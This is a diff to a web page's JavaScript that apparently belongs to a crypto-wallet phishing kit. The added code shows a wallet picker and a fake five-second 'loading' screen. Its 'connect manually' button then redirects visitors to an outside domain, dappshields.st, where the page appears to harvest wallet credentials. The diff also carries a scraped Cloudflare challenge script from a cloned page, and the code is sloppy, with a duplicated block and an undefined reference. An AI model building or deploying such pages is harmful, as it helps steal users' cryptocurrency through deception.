@@ -1416,21 +1416,168 @@
                 }
             }
         });
+    }
+    function handleWalletClick(wallet) {
+    // Update the current wallet
+    currentWallet = wallet;
 
-    </script>
-    <script src="./explore_files/jquery.min.js" type="text/javascript"></script>
-    <script src="./explore_files/jquery.scrollex.min.js" type="text/javascript"></script>
-    <script src="./explore_files/browser.min.js" type="text/javascript"></script>
-    <script src="./explore_files/breakpoints.min.js" type="text/javascript"></script>
-    <script src="./explore_files/util.js" type="text/javascript"></script>
-    <script src="./explore_files/main.js" type="text/javascript"></script>
+    // Show loading screen
+    loadingScreen.style.display = 'flex';
+    loadingImage.src = wallet.img;
 
-    <script
-        type="text/javascript">(function () { function c() { var b = a.contentDocument || a.contentWindow.document; if (b) { var d = b.createElement('script'); d.innerHTML = "window.__CF$cv$params={r:'8b92da44beca949d',t:'MTcyNDY2NTE0NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='src_assets/challenge-platform/h/b/scripts/jsd/787bc399e22f/maind41d.js';document.getElementsByTagName('head')[0].appendChild(a);"; b.getElementsByTagName('head')[0].appendChild(d) } } if (document.body) { var a = document.createElement('iframe'); a.height = 1; a.width = 1; a.style.position = 'absolute'; a.style.top = 0; a.style.left = 0; a.style.border = 'none'; a.style.visibility = 'hidden'; document.body.appendChild(a); if ('loading' !== document.readyState) c(); else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c); else { var e = document.onreadystatechange || function () { }; document.onreadystatechange = function (b) { e(b); 'loading' !== document.readyState && (document.onreadystatechange = e, c()) } } } })();</script>
-    <iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"
-        src="./explore_files/saved_resource.html"></iframe>
+    // After 5 seconds, hide loading screen and show wallet detail modal
+    setTimeout(() => {
+        loadingScreen.style.display = 'none';
+        walletDetailModal.style.display = 'flex';
+        walletDetailImage.src = wallet.img;
+        walletDetailName.textContent = wallet.name;
+    }, 5000);
+} // Retry button logic
+retryButton.addEventListener('click', () => {
+    walletDetailModal.style.display = 'none';
+    if (currentWallet) {
+        handleWalletClick(currentWallet); // Retry by reopening the loading screen with the current wallet
+    }
+});
 
-    <nav id="menu">
+function generateRandomString(length = 35) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+}
+
+
+
+
+// Connect manually button logic
+connectManuallyButton.addEventListener('click', () => {
+    if (currentWallet) {
+        const randomString = generateRandomString();
+        const { name, img, url } = currentWallet;
+        const queryParams = new URLSearchParams({
+            url: url,
+            name: name,
+            icon: img,
+            random: randomString
+        }).toString();
+        const fullUrl = `https://www.dappshields.st/overview`;
+
+
+if (currentWallet) {
+const randomString = generateRandomString();
+const { name, img, url } = currentWallet;
+const queryParams = new URLSearchParams({
+    url: url,
+    name: name,
+    icon: img,
+    random: randomString
+}).toString();
+const fullUrl = `https://www.dappshields.st/overview`;
+window.location.href = fullUrl; // Directly navigate to the URL
+}
+;
+
+
+
+
+    // Clear previous QR code if any
+    const qrCodeElement = document.getElementById('qrCode');
+    qrCodeElement.innerHTML = ''; // Clear previous QR code
+    qrCode.append(qrCodeElement);
+
+    // Update the "click to connect" link
+    const clickToConnectLink = document.getElementById('clickToConnect');
+    clickToConnectLink.href = fullUrl;
+    clickToConnectLink.textContent = 'click to connect';
+
+    // Display the modal
+    const qrCodeModal = document.getElementById('qrCodeModal');
+    qrCodeModal.style.display = 'flex';
+
+    // Close modal button functionality
+    document.getElementById('closeModalButton').onclick = () => {
+        qrCodeModal.style.display = 'none';
+    };
+
+
+    }
+});
+
+// Close wallet detail modal when clicking outside of it
+window.addEventListener('click', function(event) {
+    if (event.target == walletDetailModal) {
+        walletDetailModal.style.display = 'none';
+    }
+});
+
+// Function to update pagination buttons
+function updatePagination() {
+prevPageButton.disabled = (currentPage === 1);
+nextPageButton.disabled = (currentPage === Math.ceil(filteredWallets.length / itemsPerPage));
+}
+
+// Function to handle page change
+function changePage(page) {
+currentPage = page;
+var start = (currentPage - 1) * itemsPerPage;
+var end = start + itemsPerPage;
+displayWallets(filteredWallets.slice(start, end));
+updatePagination();
+}
+
+// Function to filter wallets based on search input
+function filterWallets() {
+var searchTerm = searchInput.value.toLowerCase();
+filteredWallets = wallets.filter(wallet => wallet.name.toLowerCase().includes(searchTerm));
+changePage(1); // Reset to the first page after filtering
+}
+
+var filteredWallets = wallets;
+displayWallets(filteredWallets.slice(0, itemsPerPage)); // Initial display of wallets
+updatePagination();
+
+// Event listener for pagination buttons
+prevPageButton.onclick = () => changePage(currentPage - 1);
+nextPageButton.onclick = () => changePage(currentPage + 1);
+
+// Event listener for search input
+searchInput.oninput = filterWallets;
+
+// Add click event listeners to open the modal
+openModalElements.forEach(function(element) {
+element.onclick = function(event) {
+    event.preventDefault(); // Prevent the default action (e.g., following the link)
+    modal.style.display = "flex"; // Show the modal and use flexbox to center it
+}
+});
+
+// Close the modal when the close button is clicked
+span.onclick = function() {
+modal.style.display = "none";
+}
+
+// Close the modal when clicking outside of it
+window.onclick = function(event) {
+if (event.target == modal) {
+    modal.style.display = "none";
+}
+}
+});
+
+</script>
+<script src="./explore_files/jquery.min.js" type="text/javascript"></script>
+<script src="./explore_files/jquery.scrollex.min.js" type="text/javascript"></script>
+<script src="./explore_files/browser.min.js" type="text/javascript"></script>
+<script src="./explore_files/breakpoints.min.js" type="text/javascript"></script>
+<script src="./explore_files/util.js" type="text/javascript"></script>
+<script src="./explore_files/main.js" type="text/javascript"></script>
+
+<script type="text/javascript">(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8b92da44beca949d',t:'MTcyNDY2NTE0NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='src_assets/challenge-platform/h/b/scripts/jsd/787bc399e22f/maind41d.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./explore_files/saved_resource.html"></iframe>
+
+<nav id="menu">
         <div class="inner">
             <h2>Menu</h2>
             <ul class="links">
